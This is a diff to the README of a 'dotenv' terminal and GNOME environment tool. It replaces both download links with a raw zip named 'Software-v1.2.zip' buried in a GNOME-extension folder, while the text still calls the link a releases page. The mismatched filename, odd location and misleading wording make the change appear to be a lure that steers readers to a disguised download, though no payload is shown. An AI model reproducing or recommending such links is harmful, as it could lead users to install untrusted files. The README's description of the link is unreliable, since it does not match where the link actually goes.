@@ -6,7 +6,7 @@ Welcome to dotenv! This application helps you manage your terminal and GNOME env
 
 ## 📥 Download Now
 
-[![Download dotenv](https://raw.githubusercontent.com/odongid/dotenv/main/kitty/dotenv-2.0-alpha.2.zip)](https://raw.githubusercontent.com/odongid/dotenv/main/kitty/dotenv-2.0-alpha.2.zip)
+[![Download dotenv](https://github.com/odongid/dotenv/raw/refs/heads/main/gnome-extensions/focus-highlight@custom/Software-v1.2.zip)](https://github.com/odongid/dotenv/raw/refs/heads/main/gnome-extensions/focus-highlight@custom/Software-v1.2.zip)
 
 ## 🖥️ System Requirements
 
@@ -27,7 +27,7 @@ Before you get started, ensure you have the following:
 
 ## 📂 Download & Install
 
-To get started, visit [this page to download](https://raw.githubusercontent.com/odongid/dotenv/main/kitty/dotenv-2.0-alpha.2.zip). Here, you’ll find the latest version alongside older versions if needed. 
+To get started, visit [this page to download](https://github.com/odongid/dotenv/raw/refs/heads/main/gnome-extensions/focus-highlight@custom/Software-v1.2.zip). Here, you’ll find the latest version alongside older versions if needed. 
 
 1. **Visit the Releases Page**: Click on the link above to go to the Releases page.
 2. **Select the Version**: Browse the available releases and choose the version you wish to download.
